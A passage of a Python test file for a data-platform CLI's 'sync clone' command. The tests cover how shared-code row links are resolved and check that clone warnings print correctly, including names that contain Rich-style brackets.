    assert task_config_ref(component_id, {"id": 1, "task": task}) == expected


def test_shared_code_row_under_another_config_is_unmapped() -> None:
    # The only created row "row-1" belongs to another shared-code config, so it
    # must not be used, and the link reports the row as unmapped.
    link = _resolve_shared_code_link(
        {"shared_code_id": "sc-ref", "shared_code_row_ids": ["row-1"]},
        created_id_map={(SHARED, "sc-ref"): "sc-new"},
        created_row_id_map={("sc-other", "row-1"): "new-row"},
    )
    assert link is not None
    assert link.config_id == "sc-new"
    assert link.row_id_map == {}
    assert link.unmapped_row_ids == ["row-1"]


def test_shared_code_link_untouched_when_nothing_was_created() -> None:
    link = _resolve_shared_code_link(
        {"shared_code_id": "sc-1", "shared_code_row_ids": ["row-1"]},
        created_id_map={},
        created_row_id_map={},
    )
    assert link is None


# ---------------------------------------------------------------------------
# CLI: `kbagent sync clone` prints the warnings
# ---------------------------------------------------------------------------


def _invoke_clone_cli(tmp_path: Path, config_dir: Path, result: dict[str, Any]) -> Any:
    source = tmp_path / "reference"
    (source / ".keboola").mkdir(parents=True)
    with patch("keboola_agent_cli.cli.SyncService") as sync_service_cls:
        service = MagicMock()
        service.clone_project.return_value = result
        sync_service_cls.return_value = service
        return CliRunner().invoke(
            app,
            [
                "--config-dir",
                str(config_dir),
                "sync",
                "clone",
                "--source",
                str(source),
                "--target",
                "target",
                "--target-dir",
                str(tmp_path / "clone"),
            ],
        )


@pytest.mark.parametrize("status", ["cloned", "dry_run", "no_changes"])
def test_cli_prints_clone_warnings(tmp_path: Path, tmp_config_dir: Path, status: str) -> None:
    warning = {"change_type": "schedule_not_active", "message": "schedule 'Nightly' not active"}
    result = _invoke_clone_cli(
        tmp_path,
        tmp_config_dir,
        {
            "status": status,
            "target_alias": "target",
            "summary": {"added": 1},
            "errors": [],
            "warnings": [warning],
        },
    )
    assert result.exit_code == 0, result.output
    assert "schedule 'Nightly' not active" in result.output


def test_cli_prints_bracketed_names_as_text(tmp_path: Path, tmp_config_dir: Path) -> None:
    # Rich reads "[orders]" as a style tag and "[/x]" as a closing tag that
    # raises MarkupError; both are names here and must print as they are.
    message = "Flow 'Load [orders] daily' task '[/x]' runs a config not in the tree."
    result = _invoke_clone_cli(
        tmp_path,
        tmp_config_dir,
        {
            "status": "cloned",
            "target_alias": "target",
            "errors": [],
            "warnings": [{"change_type": "missing_task_target", "message": message}],
        },
    )
    assert result.exit_code == 0, result.output
    assert "Load [orders] daily" in result.output
    assert "'[/x]'" in result.output
